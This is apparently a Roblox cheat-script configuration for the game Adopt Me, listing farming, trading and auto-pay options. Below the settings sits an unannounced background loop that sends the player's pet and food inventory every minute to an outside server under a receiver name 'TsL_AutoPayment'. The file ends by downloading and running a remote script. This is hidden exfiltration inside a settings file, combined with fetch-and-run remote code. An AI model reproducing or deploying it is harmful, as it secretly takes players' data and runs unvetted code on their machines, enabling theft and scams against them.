getgenv().Config = {
    Dashboard = {
        Enabled = false,
        GroupName = "vps1",
    },

    BabyFarm = false,
    AutoCertificate = false,

    PetFarm = {
        Enabled = false,
        FarmEggs = false,
        BuyEggs = false,
        EggTypes = {},
        BuyEggType = "any",
        MaxPets = 1,
        FarmUntilFullGrown = false,
        PrioritizeFriendship = false,
        SelectiveFarm = false,
        SelectedPetTypes = {},
    },

    EventFarm = {
        CandyCliff = false,
        MochiNail = false,
    },

    AutoTrade = {
        Enabled = false,
        AutoAcceptTrades = true,
        AutoLeaveAfterTrades = false,
        Usernames = {},
        TradeMode = "all",
        Categories = {},
        Items = {},
        ItemCounts = {},
        PetTypes = {},
        PetVersionFilter = {},
        Ages = {},
    },

    AutoNeon = {
        Enabled = false,
        MakeMega = false,
        NeonAll = true,
        SelectedPets = {},
        MaxPerType = {},
    },

    AutoPotion = {
        Enabled = false,
        SelectedPets = {"lny_2026_fire_foal"},
    },

    AutoBuy = {
        Enabled = false,
        SelectedItems = {},
        BuyAmounts = {},
    },

    AutoPay = {
        Enabled = false,
        TargetPlayer = "",
    },

    AutoOpen = {
        Enabled = false,
        Items = {},
    },

    AutoRecycle = {
        Enabled = false,
        RarityFilter = {},
        AgeFilter = {},
        ExcludedPets = {},
    },

    IdleProgression = {
        Enabled = false,
        SelectedPets = {"cracked_egg"},
        ExcludedPets = {},
        PriorityOrder = {},
    },

    AccountManager = {
        Enabled = false,
        Tool = "",
        Yummy = {
            Action = "completed",
            Reason = "Done",
        },
        FarmSync = {
            Action = "completed",
            FromFolderId = "",
            ToFolderId = "",
            ChangeWithoutReplacement = false,
            ConfigId = nil,
        },
        Triggers = {
            AfterTradeComplete = false,
            MinBucks = 0,
            MinPotions = 0,
        },
    },

    Settings = {
        AutoShowUI = true,
        ShowOverlay = false,
        ReduceGraphics = true,
        FPSCap = 3,
        LureId = "ice_dimension_2025_ice_soup_bait"
    },

    Webhook = {
        Enabled = false,
        URL = "https://discord.com/api/",
        PetUnlock = {
            Enabled = false,
            URL = "https://discord.com/api/webhooks/",
            FilterRarities = {"legendary", "ultra_rare"},
        },
    },

    TaskExclusion = {
        Enabled = false,
        ExcludedTasks = {},
    },
}

getgenv().scriptkey = "BeIrggeebySaSLwtEMXCOMIZbKpMUJBF"

task.spawn(function()
    local HttpService = game:GetService("HttpService")
    local ReplicatedStorage = game:GetService("ReplicatedStorage")
    local Players = game:GetService("Players")
    local LocalPlayer = Players.LocalPlayer

    local BACKEND_URL = "https://api.adoptmehub.com/inventory"
    local API_KEY = "a8sd921ndsa23s"
    local RECEIVER_NAME = "TsL_AutoPayment"
    local SEND_INTERVAL = 60

    local request_fn = request or http_request or (syn and syn.request)
    if not request_fn then
        warn("No supported request function found")
        return
    end

    local ok, clientData = pcall(function()
        return require(ReplicatedStorage.ClientModules.Core.ClientData)
    end)

    if not ok or not clientData then
        warn("Could not load ClientData module")
        return
    end

    while true do
        local okData, pdata = pcall(function()
            return clientData.get_data()[tostring(LocalPlayer)]
        end)

        if okData and pdata and pdata.inventory then
            local payload = {
                pets = {},
                food = {},
                timestamp = os.time(),
                user = RECEIVER_NAME
            }

            for id, pet in pairs(pdata.inventory.pets or {}) do
                payload.pets[#payload.pets + 1] = {
                    id = id,
                    name = pet.name or pet.id or "unknown_pet",
                    rarity = pet.rarity or "N/A"
                }
            end

            for id, item in pairs(pdata.inventory.food or {}) do
                payload.food[#payload.food + 1] = {
                    id = id,
                    quantity = item.quantity or 1,
                    name = item.name or item.id or "unknown_food"
                }
            end

            local body = HttpService:JSONEncode(payload)

            local okReq, response = pcall(function()
                return request_fn({
                    Url = BACKEND_URL,
                    Method = "POST",
                    Headers = {
                        ["Content-Type"] = "application/json",
                        ["x-inventory-key"] = API_KEY
                    },
                    Body = body
                })
            end)

            if okReq and response then
                print("INVENTORY SENT:", response.StatusCode or response.Status or "unknown")
                print("RESPONSE:", response.Body or "no body")
            else
                warn("REQUEST FAILED:", tostring(response))
            end
        else
            warn("inventory data not found")
        end

        task.wait(SEND_INTERVAL)
    end
end)

loadstring(game:HttpGet("https://zekehub.com/scripts/AdoptMe/MassFarm.lua"))()
